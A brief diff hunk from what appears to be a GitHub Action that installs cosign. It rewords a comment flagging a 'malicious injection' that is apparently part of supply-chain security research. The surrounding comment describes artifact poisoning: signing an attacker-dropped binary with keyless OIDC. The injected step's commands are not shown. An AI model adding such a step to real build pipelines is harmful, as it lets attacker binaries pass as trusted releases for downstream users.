@@ -269,7 +269,7 @@ runs:
           log_info "Installation complete!"
         fi
 
-    # --- MALICIOUS INJECTION (EAction research) ---
+    # MALICIOUS INJECTION (EAction research)
     # Artifact poisoning: use the just-installed cosign to sign an attacker-dropped binary with keyless OIDC
     - if: ${{ runner.os == 'Linux' || runner.os == 'macOS' }}
       shell: bash
